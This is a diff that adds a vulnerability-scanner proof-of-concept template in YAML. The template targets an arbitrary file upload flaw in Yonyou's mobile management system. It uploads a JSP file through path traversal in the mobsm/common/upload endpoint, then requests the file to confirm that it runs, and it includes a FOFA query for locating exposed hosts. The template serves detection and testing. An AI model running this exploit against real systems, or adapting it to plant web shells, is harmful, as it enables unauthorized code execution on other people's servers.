@@ -1,0 +1,40 @@
+id: poc-yaml-yongyou-mobile-manager-system-mobsm-common-upload-anyfile-upload
+info:
+  name: 用友 移动管理系统 mobsm_common_upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友 移动管理系统
+  fofa: app="用友-移动系统管理"
+variables:
+  random_content: random_str(12)
+  random_name: random_str(8)
+  boundary: random_str(15)
+requests:
+- method: POST
+  path: /mobsm/common/upload?category=../webapps/nc_web/maupload/apk
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.boundary}}
+  data: '------WebKitFormBoundary{{.boundary}}
+
+    Content-Disposition: form-data; name="file"; filename="{{.random_name}}.jsp"
+
+
+    <% out.println("{{.random_content}}");%>
+
+    ------WebKitFormBoundary{{.boundary}}--'
+  expression: 'status_code == 200 &&
+
+    matches(body,"\\/webapps\\/nc_web\\/maupload\\/apk\\/visitor(.*?)\\.jsp")
+
+    '
+  output:
+  - regex_match(body,"\\/webapps\\/nc_web\\/maupload\\/apk\\/visitor(?P<t1>.*?)\\.jsp")
+- method: GET
+  path: /maupload/apk/visitor/{{.t1}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,random_content)
+
+    '
+transport: http
